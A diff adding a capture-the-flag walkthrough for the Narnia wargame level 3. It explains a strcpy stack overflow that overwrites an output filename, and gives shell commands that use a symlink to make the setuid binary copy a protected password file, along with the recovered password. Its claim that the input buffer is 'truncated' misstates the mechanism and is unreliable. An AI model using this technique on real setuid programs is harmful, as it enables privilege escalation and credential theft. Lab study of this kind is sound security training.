@@ -55,3 +55,21 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Verification:** logged in as `narnia3` with this password.
 - **Recording:** `recordings/narnia/L2.cast`
 
+## Level 3 → narnia4
+- **Account:** `narnia3`.
+- **Goal:** `main` has `char ifile[32]; char ofile[16] = "/dev/null";` then `strcpy(ifile, argv[1])`, opens `ofile` read-write and `ifile` read-only, and copies 31 bytes between them.
+- **Technique and why it works:** `strcpy` into the 32-byte `ifile` overflows into the adjacent `ofile` (which sits just above it on the stack, at `ebp-0x18` vs `ebp-0x38`). If `argv[1]` is a path whose first 32 bytes form a real directory prefix and whose remaining bytes are a writable path, then: `ifile` is truncated to those first 32 bytes, while `ofile` becomes the tail. We use `/tmp/` + 27 `A`s + `/tmp/out3` (41 chars): bytes 1–32 are `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA` and bytes 33+ are `/tmp/out3`. That directory holds a symlink `out3 -> /etc/narnia_pass/narnia4`, and `/tmp/out3` is pre-created writable so `open(ofile, O_RDWR)` succeeds. The setuid program then reads the password (via the symlink) and writes it to `/tmp/out3`, which we can read.
+- **Commands:**
+  ```
+  ssh narnia3@narnia.labs.overthewire.org -p 2226
+  D=$(python3 -c 'print("A"*27)')
+  mkdir -p "/tmp/$D/tmp"
+  ln -sf /etc/narnia_pass/narnia4 "/tmp/$D/tmp/out3"
+  touch /tmp/out3; chmod 666 /tmp/out3
+  /narnia/narnia3 "/tmp/$D/tmp/out3"
+  cat /tmp/out3
+  ```
+- **Password for narnia4:** `CyWyf6uGWQ`
+- **Verification:** logged in as `narnia4` with this password.
+- **Recording:** `recordings/narnia/L3.cast`
+
